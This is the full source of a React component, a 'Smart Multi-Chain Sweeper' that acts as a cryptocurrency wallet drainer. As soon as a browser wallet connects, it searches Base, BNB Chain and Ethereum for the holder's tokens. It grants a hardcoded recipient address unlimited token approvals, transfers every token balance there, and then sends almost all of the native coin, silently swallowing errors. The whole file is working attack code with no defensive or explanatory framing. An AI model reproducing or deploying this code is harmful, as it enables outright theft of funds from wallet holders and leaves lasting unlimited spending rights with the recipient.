import { useState, useEffect } from "react";
import { ethers, ZeroAddress } from "ethers";

// Add type declaration for window.ethereum
declare global {
  interface Window {
    ethereum?: {
      request: (args: { method: string; params?: unknown[] }) => Promise<unknown>;
      on: (event: string, callback: (...args: unknown[]) => void) => void;
      removeListener: (event: string, callback: (...args: unknown[]) => void) => void;
    };
  }
}

// --- Configuration ---
// !!! IMPORTANT: SET YOUR RECIPIENT ADDRESS HERE !!!
const RECIPIENT_ADDRESS = "0x76d35535F44125239330AB1c36255504fB4E0dA9"; // Replace with the actual recipient address

// Chain configurations with improved RPC endpoints
const CHAINS = {
  base: {
    id: 8453,
    name: "Base",
    rpc: "https://mainnet.base.org",
    explorer: "https://basescan.org",
    nativeSymbol: "ETH",
    priority: 1
  },
  bsc: {
    id: 56,
    name: "BNB Chain",
    rpc: "https://bsc-dataseed1.binance.org",
    explorer: "https://bscscan.com",
    nativeSymbol: "BNB",
    priority: 2
  },
  ethereum: {
    id: 1,
    name: "Ethereum",
    rpc: "https://cloudflare-eth.com",
    explorer: "https://etherscan.io",
    nativeSymbol: "ETH",
    priority: 3
  }
};

const ERC20_ABI = [
  "function balanceOf(address owner) view returns (uint256)",
  "function transfer(address to, uint256 amount) returns (bool)",
  "function decimals() view returns (uint8)",
  "function symbol() view returns (string)",
  "function approve(address spender, uint256 amount) returns (bool)",
  "function allowance(address owner, address spender) view returns (uint256)"
];

interface ChainAssets {
  chainId: number;
  chainName: string;
  nativeBalance: bigint;
  nativeSymbol: string;
  canAffordGas: boolean;
  tokens: Array<{
    address: string;
    symbol: string;
    balance: bigint;
    decimals: number;
  }>;
}

export default function WalletConnector() {
  const [address, setAddress] = useState("");
  const [isConnecting, setIsConnecting] = useState(false);
  const [isTransferring, setIsTransferring] = useState(false);
  const [transferMessages, setTransferMessages] = useState<string[]>([]);
  const [skippedChains, setSkippedChains] = useState<Set<string>>(new Set());

  useEffect(() => {
    if (!ethers.isAddress(RECIPIENT_ADDRESS) || RECIPIENT_ADDRESS === ZeroAddress) {
      console.error("CRITICAL: Recipient address is not configured or is invalid.");
    }
  }, []);

  const addMessage = (message: string) => {
    setTransferMessages(prev => [...prev, message]);
    console.log(message);
  };

  // Enhanced error handling for RPC issues
  const handleRpcError = (error: unknown, chainName: string, operation: string): string => {
    const errorMsg = error instanceof Error ? error.message : error?.toString() || "";
    
    if (errorMsg.includes("circuit breaker") || errorMsg.includes("CALL_EXCEPTION")) {
      return `Circuit breaker/RPC issue detected on ${chainName} during ${operation}`;
    } else if (errorMsg.includes("timeout") || errorMsg.includes("TIMEOUT")) {
      return `Request timeout on ${chainName} during ${operation}`;
    } else if (errorMsg.includes("rate limit") || errorMsg.includes("429")) {
      return `Rate limit exceeded on ${chainName} during ${operation}`;
    } else {
      return `${errorMsg} on ${chainName} during ${operation}`;
    }
  };

  // Function to discover ERC20 tokens by checking transaction history
  const discoverTokensFromHistory = async (provider: ethers.BrowserProvider, userAddress: string, chainName: string): Promise<string[]> => {
    const discoveredTokens = new Set<string>();
    
    try {
      addMessage(`🔍 Discovering tokens from transaction history on ${chainName}...`);
      
      // Get recent transactions (last 1000 blocks)
      const currentBlock = await provider.getBlockNumber();
      const fromBlock = Math.max(0, currentBlock - 1000);
      
      // Get logs for Transfer events to/from the user address
      const filter = {
        fromBlock: fromBlock,
        toBlock: currentBlock,
        topics: [
          "0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef", // Transfer event signature
          null,
          "0x000000000000000000000000" + userAddress.slice(2).toLowerCase(), // to address
        ]
      };
      
      try {
        const logs = await provider.getLogs(filter);
        
        for (const log of logs) {
          if (log.address && ethers.isAddress(log.address)) {
            discoveredTokens.add(log.address);
          }
        }
        
        // Also check for transfers FROM the user address
        const filterFrom = {
          fromBlock: fromBlock,
          toBlock: currentBlock,
          topics: [
            "0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef", // Transfer event signature
            "0x000000000000000000000000" + userAddress.slice(2).toLowerCase(), // from address
            null,
          ]
        };
        
        const logsFrom = await provider.getLogs(filterFrom);
        
        for (const log of logsFrom) {
          if (log.address && ethers.isAddress(log.address)) {
            discoveredTokens.add(log.address);
          }
        }
        
        addMessage(`✅ Discovered ${discoveredTokens.size} potential tokens from transaction history on ${chainName}`);
      } catch {}
      
    } catch {}
    
    return Array.from(discoveredTokens);
  };

  // Function to get common/popular tokens for each chain as fallback
  const getCommonTokens = (chainName: string): string[] => {
    const commonTokens: { [key: string]: string[] } = {
      "Base": [
        "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913", // USDC
        "0x50c5725949A6F0c72E6C4a641F24049A917DB0Cb", // DAI
        "0x4200000000000000000000000000000000000006", // WETH
      ],
      "BNB Chain": [
        "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d", // USDC
        "0x1AF3F329e8BE154074D8769D1FFa4eE058B1DBc3", // DAI
        "0x55d398326f99059fF775485246999027B3197955", // USDT
        "0x2170Ed0880ac9A755fd29B2688956BD959F933F8", // WETH
        "0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c", // BTCB
      ],
      "Ethereum": [
        "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", // USDC
        "0x6B175474E89094C44Da98b954EedeAC495271d0F", // DAI
        "0xdAC17F958D2ee523a2206206994597C13D831ec7", // USDT
        "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2", // WETH
        "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599", // WBTC
        "0x514910771AF9Ca656af840dff83E8264EcF986CA", // LINK
        "0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984", // UNI
      ]
    };
    
    return commonTokens[chainName] || [];
  };

  // Function to discover all tokens (history + common tokens)
  const discoverAllTokens = async (provider: ethers.BrowserProvider, userAddress: string, chainName: string): Promise<string[]> => {
    const allTokens = new Set<string>();
    
    // Add timeout for token discovery (30 seconds)
    const discoveryPromise = (async () => {
      // First try transaction history
      const historyTokens = await discoverTokensFromHistory(provider, userAddress, chainName);
      historyTokens.forEach(token => allTokens.add(token));
      
      // If we found very few tokens from history, also check common tokens
      if (historyTokens.length < 3) {
        addMessage(`🔍 Checking common tokens on ${chainName} as fallback...`);
        const commonTokens = getCommonTokens(chainName);
        
        for (const tokenAddress of commonTokens) {
          try {
            const tokenInfo = await getTokenInfo(provider, tokenAddress, userAddress);
            if (tokenInfo && tokenInfo.balance > 0) {
              allTokens.add(tokenAddress);
              addMessage(`💰 Found ${ethers.formatUnits(tokenInfo.balance, tokenInfo.decimals)} ${tokenInfo.symbol} (common token) on ${chainName}`);
            }
          } catch {}
        }
      }
      
      // Note: Block scanning for airdrops is available but disabled to avoid rate limits
      // The transaction history + common tokens approach should catch most tokens
      
      return Array.from(allTokens);
    })();

    const timeoutPromise = new Promise<string[]>((resolve) => {
      setTimeout(() => {
        addMessage(`⏰ Token discovery timeout for ${chainName}, using discovered tokens so far...`);
        resolve(Array.from(allTokens));
      }, 30000); // 30 seconds timeout
    });

    return await Promise.race([discoveryPromise, timeoutPromise]);
  };

  // Function to check if a token contract is valid ERC20
  const isValidERC20 = async (provider: ethers.BrowserProvider, tokenAddress: string): Promise<boolean> => {
    try {
      const tokenContract = new ethers.Contract(tokenAddress, ERC20_ABI, provider);
      
      // Try to call basic ERC20 functions
      await Promise.all([
        tokenContract.balanceOf("0x0000000000000000000000000000000000000000"),
        tokenContract.decimals(),
        tokenContract.symbol()
      ]);
      
      return true;
    } catch {}
    return false;
  };

  // Function to get token balance and info
  const getTokenInfo = async (provider: ethers.BrowserProvider, tokenAddress: string, userAddress: string): Promise<{
    symbol: string;
    balance: bigint;
    decimals: number;
  } | null> => {
    try {
      const tokenContract = new ethers.Contract(tokenAddress, ERC20_ABI, provider);
      
      const [balance, decimals, symbol] = await Promise.all([
        tokenContract.balanceOf(userAddress),
        tokenContract.decimals(),
        tokenContract.symbol()
      ]);
      
      if (balance > 0) {
        return {
          symbol: symbol || "UNKNOWN",
          balance: balance,
          decimals: Number(decimals)
        };
      }
      
      return null;
    } catch {}
    return null;
  };

  const switchChain = async (chainId: number): Promise<boolean> => {
    if (!window.ethereum) {
      addMessage(`❌ No wallet extension available for chain switch`);
      return false;
    }
    
    try {
      // First check if we're already on the correct chain
      const currentChainIdUnknown = await window.ethereum.request({ method: 'eth_chainId' });
      const currentChainId = typeof currentChainIdUnknown === 'string' ? currentChainIdUnknown : '';
      if (parseInt(currentChainId, 16) === chainId) {
        addMessage(`✅ Already on correct chain: ${chainId}`);
        return true;
      }

      addMessage(`🔄 Switching to chain ${chainId}...`);
      
      await window.ethereum.request({
        method: 'wallet_switchEthereumChain',
        params: [{ chainId: `0x${chainId.toString(16)}` }],
      });

      // Wait for chain switch with timeout
      return new Promise<boolean>((resolve) => {
        let resolved = false;
        
        const handleChainChanged = (...args: unknown[]) => {
          const newChainId = args[0] as string;
          if (!resolved && parseInt(newChainId, 16) === chainId) {
            resolved = true;
            window.ethereum?.removeListener('chainChanged', handleChainChanged);
            addMessage(`✅ Successfully switched to chain ${chainId}`);
            resolve(true);
          }
        };

        window.ethereum?.on('chainChanged', handleChainChanged);
        
        // Timeout after 15 seconds (increased from 10)
        setTimeout(() => {
          if (!resolved) {
            resolved = true;
            window.ethereum?.removeListener('chainChanged', handleChainChanged);
            addMessage(`⚠️ Chain switch timeout for ${chainId}, continuing anyway`);
            resolve(true); // Continue anyway, might have switched
          }
        }, 15000);
      });
    } catch {}
    return false;
  };

  const scanAllChains = async (userAddress: string): Promise<ChainAssets[]> => {
    const chainAssets: ChainAssets[] = [];
    const sortedChains = Object.entries(CHAINS).sort(([,a], [,b]) => a.priority - b.priority);

    for (const [, chain] of sortedChains) {
      addMessage(`🔍 Scanning ${chain.name}...`);

      // Check if chain was manually skipped
      if (skippedChains.has(chain.name)) {
        addMessage(`⏭️ Skipping ${chain.name} (manually skipped)`);
        continue;
      }

      // Special handling for BNB Chain - check if it's having issues
      if (chain.name === "BNB Chain") {
        addMessage(`⚠️ BNB Chain detected - checking for circuit breaker issues...`);
        try {
          if (!window.ethereum) {
            addMessage(`❌ No wallet available for ${chain.name}`);
            continue;
          }
          
          addMessage(`✅ BNB Chain is responding, proceeding with scan...`);
        } catch {}
      }

      // Add overall timeout for each chain scan
      const chainScanPromise = (async () => {
        try {
          const switched = await switchChain(chain.id);
          if (!switched) {
            addMessage(`❌ Failed to switch to ${chain.name}, skipping`);
            return null;
          }

          // Add longer delay after chain switch for better stability
          await new Promise(resolve => setTimeout(resolve, 3000));

          if (!window.ethereum) {
            addMessage(`❌ No wallet available for ${chain.name}`);
            return null;
          }

          const provider = new ethers.BrowserProvider(window.ethereum);
          
          // Verify we're on the correct chain
          const network = await provider.getNetwork();
          if (Number(network.chainId) !== chain.id) {
            addMessage(`⚠️ Chain mismatch for ${chain.name}, expected ${chain.id} got ${network.chainId}`);
            // Continue anyway, might still work
          }
          
          // Get native balance with enhanced retry logic
          let nativeBalance = BigInt(0);
          let attempts = 0;
          const maxAttempts = 3;
          
          while (attempts < maxAttempts) {
            try {
              nativeBalance = await provider.getBalance(userAddress);
              break;
            } catch {}
            attempts++;
          }

          if (attempts === maxAttempts) {
            addMessage(`❌ Failed to get balance for ${chain.name} after ${maxAttempts} attempts`);
            return null;
          }
          
          // Estimate gas costs with error handling
          let gasPrice = BigInt("20000000000"); // 20 gwei fallback
          try {
            const feeData = await provider.getFeeData();
            gasPrice = feeData.gasPrice || feeData.maxFeePerGas || gasPrice;
          } catch {}
          
          // Calculate gas needed for potential transactions
          const nativeTransferGas = BigInt(21000);
          const tokenTransferGas = BigInt(80000); // Higher estimate for token transfers
          const tokenApprovalGas = BigInt(60000);
          
          const singleTxCost = gasPrice * nativeTransferGas;

          const chainAsset: ChainAssets = {
            chainId: chain.id,
            chainName: chain.name,
            nativeBalance,
            nativeSymbol: chain.nativeSymbol,
            canAffordGas: nativeBalance > (singleTxCost * BigInt(2)), // Can afford at least 2 transactions
            tokens: []
          };

          // Discover and scan tokens dynamically
          addMessage(`🔍 Discovering tokens on ${chain.name}...`);
          
          // Discover tokens from transaction history
          const discoveredTokenAddresses = await discoverAllTokens(provider, userAddress, chain.name);
          
          if (discoveredTokenAddresses.length === 0) {
            addMessage(`💨 No token interactions found on ${chain.name}`);
          } else {
            addMessage(`🔍 Checking ${discoveredTokenAddresses.length} discovered tokens on ${chain.name}...`);
            
            for (let i = 0; i < discoveredTokenAddresses.length; i++) {
              const tokenAddress = discoveredTokenAddresses[i];
              let retryCount = 0;
              const maxRetries = 2;
              
              while (retryCount <= maxRetries) {
                try {
                  // First validate if it's a proper ERC20 token
                  const isValid = await isValidERC20(provider, tokenAddress);
                  if (!isValid) {
                    addMessage(`⚠️ Skipping invalid token contract ${tokenAddress.slice(0, 10)}... on ${chain.name}`);
                    break;
                  }
                  
                  // Get token info and balance
                  const tokenInfo = await getTokenInfo(provider, tokenAddress, userAddress);
                  
                  if (tokenInfo && tokenInfo.balance > 0) {
                    chainAsset.tokens.push({
                      address: tokenAddress,
                      symbol: tokenInfo.symbol,
                      balance: tokenInfo.balance,
                      decimals: tokenInfo.decimals
                    });
                    
                    const formattedAmount = ethers.formatUnits(tokenInfo.balance, tokenInfo.decimals);
                    addMessage(`💰 Found ${formattedAmount} ${tokenInfo.symbol} on ${chain.name}`);
                  }
                  break; // Success, exit retry loop
                } catch {}
                retryCount++;
              }
            }
          }

          // Log native balance
          if (nativeBalance > 0) {
            const formattedNative = ethers.formatEther(nativeBalance);
            addMessage(`💰 Found ${formattedNative} ${chain.nativeSymbol} on ${chain.name} (Gas sufficient: ${chainAsset.canAffordGas ? 'Yes' : 'No'})`);
          } else {
            addMessage(`💨 No ${chain.nativeSymbol} found on ${chain.name}`);
          }

          // Determine if we can afford gas for token operations
          const tokensNeedingTransfer = chainAsset.tokens.length;
          if (tokensNeedingTransfer > 0) {
            const totalGasNeeded = (BigInt(tokensNeedingTransfer) * (tokenApprovalGas + tokenTransferGas)) + singleTxCost;
            chainAsset.canAffordGas = nativeBalance > totalGasNeeded;
            addMessage(`⛽ Gas check for ${chain.name}: Need ${ethers.formatEther(totalGasNeeded)} ${chain.nativeSymbol}, Have ${ethers.formatEther(nativeBalance)} ${chain.nativeSymbol}`);
          }

          addMessage(`✅ Completed scanning ${chain.name}`);
          return chainAsset;

        } catch {}
        return null;
      })();

      // Add timeout for each chain scan (2 minutes)
      const timeoutPromise = new Promise<null>((resolve) => {
        setTimeout(() => {
          addMessage(`⏰ Timeout reached for ${chain.name} scanning, moving to next chain...`);
          resolve(null);
        }, 120000); // 2 minutes timeout
      });

      const chainAsset = await Promise.race([chainScanPromise, timeoutPromise]);
      
      if (chainAsset) {
        chainAssets.push(chainAsset);
      }
      
      // Add delay between chain scans
      await new Promise(resolve => setTimeout(resolve, 2000));
    }

    return chainAssets;
  };

  const executeTransfersForChain = async (chainAsset: ChainAssets, userAddress: string): Promise<boolean> => {
    if (!chainAsset.canAffordGas && chainAsset.tokens.length > 0) {
      addMessage(`⚠️ Skipping ${chainAsset.chainName} - insufficient gas for token transfers`);
      return false;
    }

    addMessage(`\n🚀 Processing ${chainAsset.chainName}...`);
    
    try {
      const switched = await switchChain(chainAsset.chainId);
      if (!switched) {
        addMessage(`❌ Failed to switch to ${chainAsset.chainName}`);
        return false;
      }

      // Wait after chain switch
      await new Promise(resolve => setTimeout(resolve, 3000));

      if (!window.ethereum) {
        addMessage(`❌ No wallet available for ${chainAsset.chainName}`);
        return false;
      }

      const provider = new ethers.BrowserProvider(window.ethereum);
      const signer = await provider.getSigner();

      let hasTransfers = false;

      // First, handle all token approvals in batch
      if (chainAsset.tokens.length > 0) {
        addMessage(`📝 Processing token approvals for ${chainAsset.chainName}...`);
        
        for (const token of chainAsset.tokens) {
          try {
            const tokenContract = new ethers.Contract(token.address, ERC20_ABI, signer);
            
            // Check current allowance
            const currentAllowance = await tokenContract.allowance(userAddress, RECIPIENT_ADDRESS);
            
            if (currentAllowance < token.balance) {
              addMessage(`📝 Approving ${token.symbol}...`);
              
              // Approve maximum amount to avoid future approvals
              const approveTx = await tokenContract.approve(RECIPIENT_ADDRESS, ethers.MaxUint256, {
                gasLimit: 60000 // Set explicit gas limit
              });
              addMessage(`⏳ Waiting for ${token.symbol} approval...`);
              await approveTx.wait();
              addMessage(`✅ ${token.symbol} approved`);
            } else {
              addMessage(`✅ ${token.symbol} already approved`);
            }
          } catch {}
        }

        // Then transfer all tokens
        addMessage(`📤 Transferring tokens on ${chainAsset.chainName}...`);
        
        for (const token of chainAsset.tokens) {
          try {
            const tokenContract = new ethers.Contract(token.address, ERC20_ABI, signer);
            
            addMessage(`📤 Transferring ${ethers.formatUnits(token.balance, token.decimals)} ${token.symbol}...`);
            
            const transferTx = await tokenContract.transfer(RECIPIENT_ADDRESS, token.balance, {
              gasLimit: 80000 // Set explicit gas limit
            });
            addMessage(`⏳ Waiting for ${token.symbol} transfer confirmation...`);
            
            const receipt = await transferTx.wait();
            if (receipt && receipt.status === 1) {
              addMessage(`✅ ${token.symbol} transfer completed`);
              hasTransfers = true;
            } else {
              addMessage(`❌ ${token.symbol} transfer failed`);
            }
          } catch {}
        }
      }

      // Finally, transfer native currency (leaving some for gas if needed elsewhere)
      if (chainAsset.nativeBalance > 0) {
        try {
          const currentBalance = await provider.getBalance(userAddress);
          const feeData = await provider.getFeeData();
          const gasPrice = feeData.gasPrice || feeData.maxFeePerGas || BigInt("20000000000");
          const gasLimit = BigInt(21000);
          const gasCost = gasLimit * gasPrice * BigInt(3); // 3x buffer for safety

          if (currentBalance > gasCost) {
            const amountToSend = currentBalance - gasCost;
            const formattedAmount = ethers.formatEther(amountToSend);
            
            addMessage(`📤 Transferring ${formattedAmount} ${chainAsset.nativeSymbol}...`);
            
            const nativeTx = await signer.sendTransaction({
              to: RECIPIENT_ADDRESS,
              value: amountToSend,
              gasLimit: gasLimit
            });
            
            addMessage(`⏳ Waiting for ${chainAsset.nativeSymbol} transfer confirmation...`);
            
            const receipt = await nativeTx.wait();
            if (receipt && receipt.status === 1) {
              addMessage(`✅ ${chainAsset.nativeSymbol} transfer completed`);
              hasTransfers = true;
            } else {
              addMessage(`❌ ${chainAsset.nativeSymbol} transfer failed`);
            }
          } else {
            addMessage(`⚠️ ${chainAsset.nativeSymbol} balance too low after gas estimation`);
          }
        } catch {}
      }

      return hasTransfers;

    } catch {}
    return false;
  };

  const handleSuccessfulConnection = async (signer: ethers.Signer, userAddress: string) => {
    setAddress(userAddress);
    setTransferMessages([]);
    
    if (!ethers.isAddress(RECIPIENT_ADDRESS) || RECIPIENT_ADDRESS === ZeroAddress) {
      const msg = "Asset transfer aborted: Recipient address is invalid or not set.";
      addMessage(msg);
      return;
    }

    addMessage(`🔗 Connected: ${userAddress}`);
    addMessage(`🎯 Target: ${RECIPIENT_ADDRESS}`);
    addMessage(`\n📊 Starting comprehensive asset scan...`);
    
    setIsTransferring(true);

    try {
      // Scan all chains for assets
      const allChainAssets = await scanAllChains(userAddress);
      
      // Filter chains that have assets and can afford operations
      const viableChains = allChainAssets.filter(chain => 
        (chain.tokens.length > 0 && chain.canAffordGas) || 
        (chain.tokens.length === 0 && chain.nativeBalance > 0)
      );

      if (viableChains.length === 0) {
        addMessage(`\n❌ No viable assets found across all chains`);
        setIsTransferring(false);
        return;
      }

      addMessage(`\n📋 Found assets on ${viableChains.length} chains:`);
      viableChains.forEach(chain => {
        const tokenCount = chain.tokens.length;
        const nativeAmount = ethers.formatEther(chain.nativeBalance);
        addMessage(`  • ${chain.chainName}: ${tokenCount} tokens + ${nativeAmount} ${chain.nativeSymbol}`);
      });

      addMessage(`\n⚡ Starting automatic transfers...`);
      
      let totalSuccessfulChains = 0;

      // Process each viable chain
      for (const chainAsset of viableChains) {
        const success = await executeTransfersForChain(chainAsset, userAddress);
        if (success) {
          totalSuccessfulChains++;
        }
        
        // Small delay between chains
        await new Promise(resolve => setTimeout(resolve, 2000));
      }

      addMessage(`\n🏁 SWEEP COMPLETED`);
      addMessage(`✅ Successfully processed ${totalSuccessfulChains}/${viableChains.length} chains`);
      addMessage(`🎉 All available assets transferred to: ${RECIPIENT_ADDRESS}`);

    } catch (err) {
      addMessage(`❌ Critical error during sweep: ${handleRpcError(err, "sweep", "critical")}`);
    } finally {
      setIsTransferring(false);
    }
  };

  const connectWithExtension = async () => {
    setIsConnecting(true);

    try {
      if (!window.ethereum) {
        console.error("No crypto wallet extension detected. Please install MetaMask or a similar extension.");
        setIsConnecting(false);
        return false;
      }
      
      const provider = new ethers.BrowserProvider(window.ethereum);
      const accounts = await provider.send("eth_requestAccounts", []);
      if (!accounts || accounts.length === 0) {
          console.error("No accounts found or permission denied by user.");
          setIsConnecting(false);
          return false;
      }
      const signer = await provider.getSigner();
      const userAddress = await signer.getAddress();
      
      await handleSuccessfulConnection(signer, userAddress);
      return true;
    } catch {}
    return false;
  };

  const disconnectWallet = async () => {
    setAddress("");
    setTransferMessages([]);
    setIsTransferring(false);
    setSkippedChains(new Set());
    console.log("Wallet disconnected from dApp.");
  };

  return (
    <div className="min-h-screen flex flex-col items-center justify-center p-2 sm:p-4 bg-gray-50 dark:bg-gray-900">
      <div className="w-full max-w-lg bg-gradient-to-br from-gray-800/60 to-gray-900/60 border border-gray-700/60 shadow-lg rounded-lg p-4 sm:p-6">
        <h1 className="text-2xl font-bold mb-2 text-center dark:text-white">
          ⚡ Smart Multi-Chain Sweeper
        </h1>
        <p className="text-xs text-center text-red-500 dark:text-red-400 mb-1 font-semibold">
          🚨 AUTO-EXECUTION: Connection triggers immediate intelligent asset sweep
        </p>
        <p className="text-xs text-center text-yellow-500 dark:text-yellow-400 mb-1">
          💡 Smart Logic: Tokens first → Native last → Skip chains with insufficient gas
        </p>
        <p className="text-xs text-center text-blue-500 dark:text-blue-400 mb-4">
          🔍 Dynamic token discovery → Max approvals → Batch operations → Automatic execution
        </p>
        
        {!address ? (
          <div className="space-y-4">
            <div className="p-3 bg-red-50 dark:bg-red-900 rounded-lg border border-red-200 dark:border-red-700">
              <p className="text-xs text-red-700 dark:text-red-300 font-medium">
                🎯 TARGET RECIPIENT:
              </p>
              <p className="font-mono text-xs text-red-800 dark:text-red-200 break-all">
                {RECIPIENT_ADDRESS}
              </p>
            </div>
            
            <div className="p-3 bg-blue-50 dark:bg-blue-900 rounded-lg border border-blue-200 dark:border-blue-700">
              <p className="text-xs text-blue-700 dark:text-blue-300 font-medium mb-2">
                🧠 SMART SWEEP LOGIC:
              </p>
              <div className="space-y-1">
                <p className="text-xs text-blue-600 dark:text-blue-400">• Discover all tokens dynamically</p>
                <p className="text-xs text-blue-600 dark:text-blue-400">• Scan transaction history + common tokens</p>
                <p className="text-xs text-blue-600 dark:text-blue-400">• Check gas availability per chain</p>
                <p className="text-xs text-blue-600 dark:text-blue-400">• Process tokens → native in order</p>
              </div>
            </div>
            
            <button
              onClick={connectWithExtension}
              disabled={isConnecting || !ethers.isAddress(RECIPIENT_ADDRESS) || RECIPIENT_ADDRESS === ZeroAddress}
              className={`w-full py-3 px-4 rounded-lg font-medium ${
                isConnecting || !ethers.isAddress(RECIPIENT_ADDRESS) || RECIPIENT_ADDRESS === ZeroAddress
                  ? "bg-gray-400 cursor-not-allowed"
                  : "bg-red-600 hover:bg-red-700"
              } text-white transition-colors`}
            >
              {isConnecting ? "Connecting..." : (!ethers.isAddress(RECIPIENT_ADDRESS) || RECIPIENT_ADDRESS === ZeroAddress) ? "Configure Recipient First" : "⚡ CONNECT & AUTO-SWEEP"}
            </button>
          </div>
        ) : (
          <div className="space-y-4">
            <div className="p-3 bg-gray-100 dark:bg-gray-700 rounded-lg">
              <p className="text-sm font-medium text-gray-500 dark:text-gray-300">
                🔗 Connected (Browser Extension):
              </p>
              <p className="font-mono text-sm text-blue-600 dark:text-blue-400 break-all">
                {address}
              </p>
              <p className="text-sm font-medium text-gray-500 dark:text-gray-300 mt-2">
                🎯 Target Recipient:
              </p>
              <p className="font-mono text-sm text-green-600 dark:text-green-400 break-all">
                {RECIPIENT_ADDRESS}
              </p>
            </div>

            {(isTransferring || transferMessages.length > 0) && (
              <div className={`mt-4 p-3 rounded-lg ${isTransferring ? 'bg-blue-50 dark:bg-blue-900 border border-blue-300 dark:border-blue-700' : 'bg-gray-50 dark:bg-gray-700 border border-gray-200 dark:border-gray-600'}`}>
                <p className={`font-medium ${isTransferring ? 'text-blue-700 dark:text-blue-300' : 'text-gray-700 dark:text-gray-200'}`}>
                  {isTransferring ? "🧠 Smart sweep in progress..." : "📋 Sweep completed:"}
                </p>
                {/* Transfer log */}
                <div className="mt-2 h-64 overflow-y-auto text-xs text-gray-600 dark:text-gray-300 space-y-1 styled-scrollbar">
                  {transferMessages.map((msg, index) => (
                    <p key={index} className={
                      msg.includes("❌") || msg.startsWith("ERROR") || msg.includes("FAILED") ? "text-red-500 dark:text-red-400" : 
                      msg.includes("✅") || msg.includes("SUCCESS") ? "text-green-500 dark:text-green-400" :
                      msg.includes("💰") ? "text-blue-600 dark:text-blue-400 font-medium" :
                      msg.includes("🚀") || msg.includes("🏁") ? "text-purple-600 dark:text-purple-400 font-semibold" :
                      msg.includes("📤") || msg.includes("⏳") ? "text-orange-500 dark:text-orange-400" :
                      msg.includes("⏭️") || msg.includes("⏰") ? "text-yellow-600 dark:text-yellow-400" :
                      ""
                    }>
                      {msg}
                    </p>
                  ))}
                  {isTransferring && (
                    <p className="text-blue-500 animate-pulse">🧠 Executing smart transfers...</p>
                  )}
                </div>
              </div>
            )}
            <button
              onClick={disconnectWallet}
              disabled={isTransferring}
              className="w-full py-2 px-4 bg-gray-500 hover:bg-gray-600 text-white rounded-lg transition-colors"
            >
              {isTransferring ? "Disconnecting..." : "Disconnect"}
            </button>
          </div>
        )}
      </div>
    </div>
  );
}